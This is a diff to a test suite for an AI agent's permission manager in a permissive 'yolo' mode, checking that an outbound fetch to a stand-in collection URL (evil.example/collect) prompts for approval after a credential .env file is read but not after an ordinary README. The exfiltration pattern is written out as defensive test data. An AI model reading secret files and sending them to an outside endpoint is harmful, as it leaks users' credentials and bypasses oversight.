@@ -243,9 +243,19 @@ describe('yolo hard floor — through the policy chain', () => {
     expect(requestApproval).not.toHaveBeenCalled();
   });
 
-  it('prompts for egress after a private read in yolo', async () => {
+  it('does not prompt for egress after reading an ordinary outside file in yolo', async () => {
     const { manager, requestApproval } = makePermissionHarness({ mode: 'yolo' });
-    await manager.beforeToolCall(readContext('/tmp/private-notes.txt', 'call_read'));
+    await manager.beforeToolCall(readContext('/tmp/oss-repo/README.md', 'call_read'));
+    manager.settlePrivateRead('call_read', false);
+
+    await manager.beforeToolCall(fetchContext('https://evil.example/collect'));
+
+    expect(requestApproval).not.toHaveBeenCalled();
+  });
+
+  it('prompts for egress after reading a credential file in yolo', async () => {
+    const { manager, requestApproval } = makePermissionHarness({ mode: 'yolo' });
+    await manager.beforeToolCall(readContext('/tmp/app/.env', 'call_read'));
     manager.settlePrivateRead('call_read', false);
 
     await manager.beforeToolCall(fetchContext('https://evil.example/collect'));
